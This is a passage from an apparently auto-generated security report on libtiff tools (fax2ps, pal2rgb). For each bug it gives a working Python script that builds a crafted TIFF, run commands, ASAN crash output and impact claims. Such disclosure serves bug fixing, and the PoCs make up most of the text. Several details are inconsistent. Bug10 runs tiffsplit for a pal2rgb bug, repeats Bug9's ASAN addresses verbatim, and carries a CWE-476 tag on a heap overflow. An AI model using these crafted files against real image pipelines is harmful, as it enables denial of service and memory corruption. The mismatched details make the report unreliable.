An attacker who supplies a crafted TIFF file can cause `tiffsplit` (and any application using `TIFFReadRawTile`) to perform an out-of-bounds read of up to the specified tile byte count from memory far outside the mapped file region, resulting in a reliable crash (denial of service). On platforms where adjacent virtual memory is mapped or in 32-bit address spaces the same primitive can expose sensitive in-process data or be leveraged for further exploitation, and the attack requires only that a victim open the malicious file with no elevated privileges needed.

<!-- REPORT_SOURCE: libtiff_tif_read_c#002 -->
<!-- DEDUP: TIFFReadRawTile1::CWE-125 -->

## Bug8: pcompar casts uint16 element pointer to int causing heap-buffer-overflow OOB read

In `pcompar()` in `tools/fax2ps.c` (lines 309-315), the comparator casts each `void*` argument to `const int*` and dereferences it as a 4-byte integer, but the `pages[]` array is allocated with `sizeof(uint16)` = 2 bytes per element, so comparing the last element reads 2 bytes beyond the heap allocation boundary and triggers a heap-buffer-overflow out-of-bounds read.

### PoC

Craft a malicious TIFF file using the Python script below and process it with the ASAN-instrumented fax2ps binary to trigger the vulnerability.

```python
#!/usr/bin/env python3
import struct

OUTPUT = "poc_input.tif"

def make_tiff():
    BYTE     = 1
    SHORT    = 3
    LONG     = 4
    RATIONAL = 5

    width  = 8
    height = 1
    image_data = b'\xff' * ((width + 7) // 8 * height)  # 1 byte: all black

    # Header: II (little-endian), magic 42, offset of first IFD = 8
    header = struct.pack('<2sHI', b'II', 42, 8)

    num_tags = 11

    # IFD starts at offset 8
    # Each IFD entry: tag(2) type(2) count(4) value_or_offset(4) = 12 bytes
    ifd_size = 2 + num_tags * 12 + 4  # count field + entries + next IFD ptr
    ifd_offset = 8

    # Data area starts after IFD
    data_offset = ifd_offset + ifd_size

    # Rational values (8 bytes each): XRes and YRes
    xres_offset = data_offset
    yres_offset = xres_offset + 8
    image_offset = yres_offset + 8

    def ifd_entry(tag, typ, count, value):
        return struct.pack('<HHII', tag, typ, count, value)

    entries = b''
    entries += ifd_entry(256, SHORT, 1, width)           # ImageWidth
    entries += ifd_entry(257, SHORT, 1, height)          # ImageLength
    entries += ifd_entry(258, SHORT, 1, 1)               # BitsPerSample
    entries += ifd_entry(259, SHORT, 1, 1)               # Compression = None
    entries += ifd_entry(262, SHORT, 1, 0)               # PhotometricInterp = WhiteIsZero
    entries += ifd_entry(273, LONG,  1, image_offset)    # StripOffsets
    entries += ifd_entry(278, SHORT, 1, height)          # RowsPerStrip
    entries += ifd_entry(279, LONG,  1, len(image_data)) # StripByteCounts
    entries += ifd_entry(282, RATIONAL, 1, xres_offset)  # XResolution
    entries += ifd_entry(283, RATIONAL, 1, yres_offset)  # YResolution
    entries += ifd_entry(296, SHORT, 1, 2)               # ResolutionUnit = inch

    ifd = struct.pack('<H', num_tags) + entries + struct.pack('<I', 0)  # next IFD = 0

    # Rational data: numerator=72, denominator=1
    xres_data = struct.pack('<II', 72, 1)
    yres_data = struct.pack('<II', 72, 1)

    tiff = header + ifd + xres_data + yres_data + image_data
    return tiff

tiff_bytes = make_tiff()
with open(OUTPUT, 'wb') as f:
    f.write(tiff_bytes)
print(f"[+] Written {len(tiff_bytes)} bytes to {OUTPUT}")
```

```bash
python3 gen.py
ASAN_OPTIONS="abort_on_error=0:log_path=./asan.log" ./build_test/bin/fax2ps -p 2 -p 1 poc_input.tif || true
for f in ./asan.log.*; do grep -E "AddressSanitizer|ERROR:|runtime error:" "$f" || true; done
```

**Result:** ERROR: AddressSanitizer: heap-buffer-overflow on address 0x502000000032 at pc 0x55c55855ae28 bp 0x7fff1c805900 sp 0x7fff1c8058f0
READ of size 4 at 0x502000000032 thread T0
    #0 0x55c55855ae27 in pcompar fax2ps+0x9e27
    #1 0x7f14eb7288cf in __interceptor_qsort sanitizer_common_interceptors.inc:9899

### Impact

An attacker who supplies a crafted TIFF file and triggers the `-p` flag path causes `fax2ps` to perform a 4-byte read 2 bytes past the end of a heap-allocated `uint16` array, exposing heap allocator metadata such as chunk size and flag fields. This out-of-bounds read can leak internal heap layout information that aids in bypassing ASLR when chained with a write primitive. Additionally, returning incorrect comparison values from `pcompar` corrupts the page ordering and may produce malformed PostScript output, constituting a denial-of-service for workflows that depend on correct page sequencing.

<!-- REPORT_SOURCE: tools_fax2ps_c#001 -->
<!-- DEDUP: pcompar::CWE-125 -->

## Bug9: Heap buffer overflow in pal2rgb main() via TIFFScanlineSize integer overflow writing to malloc(0) obuf

In `tools/pal2rgb.c` `main()`, `TIFFScanlineSize(out)` overflows a `uint32` when `imagewidth` is 178,956,971 (producing a computed size of 0), causing `_TIFFmalloc(0)` to return a 1-byte allocation into which the pixel copy loop subsequently writes approximately 536 MB, resulting in a heap buffer overflow.

### PoC

Craft a malicious TIFF file using the Python script below and process it with the ASAN-instrumented tiffsplit binary to trigger the vulnerability.

```python
#!/usr/bin/env python3
import struct

IMAGEWIDTH      = 178956971
IMAGELENGTH     = 1
BITSPERSAMPLE   = 8
COMPRESSION     = 32773  # PackBits
PHOTOMETRIC     = 3      # PALETTE
SAMPLESPERPIXEL = 1
ROWSPERSTRIP    = 1

def packbits_zeros(n):
    full_runs = n // 128
    remainder = n % 128
    data = bytearray(b'\x81\x00' * full_runs)
    if remainder > 0:
        run_header = (1 - remainder) & 0xFF
        data += bytearray([run_header, 0x00])
    return bytes(data)

def build_tiff():
    strip_data = packbits_zeros(IMAGEWIDTH)
    strip_size = len(strip_data)

    ifd_offset   = 8
    num_entries  = 10
    ifd_size     = 2 + num_entries * 12 + 4  # 126 bytes
    colormap_off = ifd_offset + ifd_size      # 134
    strip_off    = colormap_off + 768 * 2     # 1670

    header  = b'\x49\x49'
    header += struct.pack('<H', 42)
    header += struct.pack('<I', ifd_offset)

    ifd_entries = []
    ifd_entries.append(struct.pack('<HHII',  0x0100, 4, 1, IMAGEWIDTH))
    ifd_entries.append(struct.pack('<HHII',  0x0101, 4, 1, IMAGELENGTH))
    ifd_entries.append(struct.pack('<HHIHH', 0x0102, 3, 1, BITSPERSAMPLE, 0))
    ifd_entries.append(struct.pack('<HHIHH', 0x0103, 3, 1, COMPRESSION, 0))
    ifd_entries.append(struct.pack('<HHIHH', 0x0106, 3, 1, PHOTOMETRIC, 0))
    ifd_entries.append(struct.pack('<HHII',  0x0111, 4, 1, strip_off))
    ifd_entries.append(struct.pack('<HHIHH', 0x0115, 3, 1, SAMPLESPERPIXEL, 0))
    ifd_entries.append(struct.pack('<HHII',  0x0116, 4, 1, ROWSPERSTRIP))
    ifd_entries.append(struct.pack('<HHII',  0x0117, 4, 1, strip_size))
    ifd_entries.append(struct.pack('<HHII',  0x0140, 3, 768, colormap_off))

    ifd = struct.pack('<H', num_entries)
    for e in ifd_entries:
        ifd += e
    ifd += struct.pack('<I', 0)

    colormap = b'\x00' * (768 * 2)

    tiff = header + ifd + colormap + strip_data
    with open('poc_input.tif', 'wb') as f:
        f.write(tiff)
    print(f"[+] Written poc_input.tif: {len(tiff)} bytes")

if __name__ == '__main__':
    build_tiff()
```

```bash
python3 gen.py
ASAN_OPTIONS="abort_on_error=0:log_path=./asan.log" ./build_test/bin/pal2rgb poc_input.tif /tmp/out_ || true
for f in ./asan.log.*; do grep -E "AddressSanitizer|ERROR:|runtime error:" "$f" || true; done
```

**Result:** ERROR: AddressSanitizer: heap-buffer-overflow on address 0x502000000071 at pc 0x561545e30306 bp 0x7ffd087867f0 sp 0x7ffd087867e0
WRITE of size 1 at 0x502000000071 thread T0
    #0 0x561545e30305 in main (pal2rgb+0x8305)
    #1 0x7f85c0acdd8f in __libc_start_call_main ../sysdeps/nptl/libc_start_call_main.h:58

### Impact

An attacker who supplies a crafted TIFF file with an oversized `ImageWidth` field can cause `pal2rgb` to write approximately 536 MB of pixel data into a 1-byte heap allocation, producing a severe heap buffer overflow that corrupts adjacent heap metadata and object contents. This corruption reliably crashes the process (denial of service) and, under controlled heap layout conditions, can overwrite heap management structures in a manner that enables arbitrary code execution. The attack surface is the command-line processing of untrusted TIFF files with no authentication required from the attacker.

<!-- REPORT_SOURCE: tools_pal2rgb_c#001 -->
<!-- DEDUP: main::CWE-122 -->

## Bug10: Heap-buffer-overflow in pal2rgb main() due to unchecked _TIFFmalloc return size against actual strip data

In `tools/pal2rgb.c`, the `main()` function at lines 180-188 allocates `ibuf` via `_TIFFmalloc(TIFFScanlineSize(in))` without validating that the returned allocation is backed by sufficient data, so when a crafted TIFF file declares a scanline width of 536870911 bytes but provides only 1 byte of strip data, the subsequent pixel loop reads past the end of the heap buffer and triggers a heap-buffer-overflow.

### PoC

Craft a malicious TIFF file using the Python script below and process it with the ASAN-instrumented tiffsplit binary to trigger the vulnerability.

```python
#!/usr/bin/env python3
import struct

# Layout:
# Offset 0:   8 bytes  - TIFF header
# Offset 8:   2 bytes  - IFD entry count (10)
# Offset 10:  120 bytes - 10 IFD entries (12 bytes each)
# Offset 130: 4 bytes  - next IFD offset (0)
# Total IFD block ends at offset 134
# Offset 134: 1536 bytes - Colormap (768 SHORTs, all zeros)
# Offset 1670: 1 byte  - strip data (0x00)

COLORMAP_OFFSET = 134
STRIP_OFFSET = 1670

# 0x1FFFFFFF: largest width that avoids uint32 overflow in TIFFScanlineSize
# multiply(0x1FFFFFFF, 8) = 0xFFFFFFF8 fits in uint32, so no overflow protection fires
# TIFFScanlineSize returns 536870911 bytes (~512 MB) but strip has only 1 byte
IMAGEWIDTH = 0x1FFFFFFF  # 536870911

# TIFF header: little-endian, magic 0x002A, IFD at offset 8
header = b'\x49\x49\x2a\x00' + struct.pack('<I', 8)

# IFD entries (12 bytes each), tags in ascending order
entries = b''

# 0x0100 ImageWidth = IMAGEWIDTH (LONG, type=4)
entries += struct.pack('<HHI', 0x0100, 4, 1) + struct.pack('<I', IMAGEWIDTH)

# 0x0101 ImageLength = 1 (LONG, type=4)
entries += struct.pack('<HHI', 0x0101, 4, 1) + struct.pack('<I', 1)

# 0x0102 BitsPerSample = 8 (SHORT, type=3)
entries += struct.pack('<HHI', 0x0102, 3, 1) + struct.pack('<HH', 8, 0)

# 0x0103 Compression = 1 no compression (SHORT, type=3)
entries += struct.pack('<HHI', 0x0103, 3, 1) + struct.pack('<HH', 1, 0)

# 0x0106 PhotometricInterpretation = 3 PALETTE (SHORT, type=3)
entries += struct.pack('<HHI', 0x0106, 3, 1) + struct.pack('<HH', 3, 0)

# 0x0111 StripOffsets = STRIP_OFFSET (LONG, type=4, count=1)
entries += struct.pack('<HHI', 0x0111, 4, 1) + struct.pack('<I', STRIP_OFFSET)

# 0x0115 SamplesPerPixel = 1 (SHORT, type=3)
entries += struct.pack('<HHI', 0x0115, 3, 1) + struct.pack('<HH', 1, 0)

# 0x0116 RowsPerStrip = 1 (LONG, type=4)
entries += struct.pack('<HHI', 0x0116, 4, 1) + struct.pack('<I', 1)

# 0x0117 StripByteCounts = 1 (LONG, type=4)
# Only 1 byte of strip data declared, but scanline needs 512MB
entries += struct.pack('<HHI', 0x0117, 4, 1) + struct.pack('<I', 1)

# 0x0140 Colormap = 768 SHORTs at COLORMAP_OFFSET (SHORT, type=3, count=768)
entries += struct.pack('<HHI', 0x0140, 3, 768) + struct.pack('<I', COLORMAP_OFFSET)

# IFD block: count + entries + next IFD
ifd_block = struct.pack('<H', 10) + entries + struct.pack('<I', 0)

# Colormap: 768 SHORTs all zeros (1536 bytes)
colormap = b'\x00' * (768 * 2)

# Strip data: 1 byte (claimed 512MB scanline but only 1 byte present)
strip_data = b'\x00'

# Build file
tiff_data = header + ifd_block + colormap + strip_data

out_file = 'poc_input.tif'
with open(out_file, 'wb') as f:
    f.write(tiff_data)

print(f"[+] Written {len(tiff_data)} bytes to {out_file}")
print(f"    ImageWidth = 0x{IMAGEWIDTH:08X} ({IMAGEWIDTH}), TIFFScanlineSize = {IMAGEWIDTH} bytes")
print(f"    StripByteCounts = 1 (only 1 byte of actual data)")
```

```bash
python3 gen.py
ASAN_OPTIONS="abort_on_error=0:log_path=./asan.log" ./build_test/bin/tiffsplit poc_input.tif /tmp/out_ || true
for f in ./asan.log.*; do grep -E "AddressSanitizer|ERROR:|runtime error:" "$f" || true; done
```

**Result:** ERROR: AddressSanitizer: heap-buffer-overflow on address 0x502000000071 at pc 0x561545e30306 bp 0x7ffd087867f0 sp 0x7ffd087867e0
SUMMARY: AddressSanitizer: heap-buffer-overflow (/path/to/pal2rgb+0x8305) in main

### Impact

An attacker who can supply a crafted TIFF file to any pipeline invoking `pal2rgb` can trigger a heap-buffer-overflow in `main()` by setting `ImageWidth` to a value large enough that `TIFFScanlineSize` returns a multi-hundred-megabyte scanline size while `StripByteCounts` is set to 1, causing the pixel expansion loop to read far beyond the allocated buffer. The overflow is a heap read past the end of a buffer whose actual content was written by a short strip read, which can lead to process termination (denial of service) and, under conditions where an attacker controls heap layout, may expose adjacent heap data. Automated image-processing pipelines that pass untrusted files to `pal2rgb` are directly exposed to this denial-of-service vector with no authentication required beyond file delivery.

<!-- REPORT_SOURCE: tools_pal2rgb_c#002 -->
<!-- DEDUP: main::CWE-476 -->
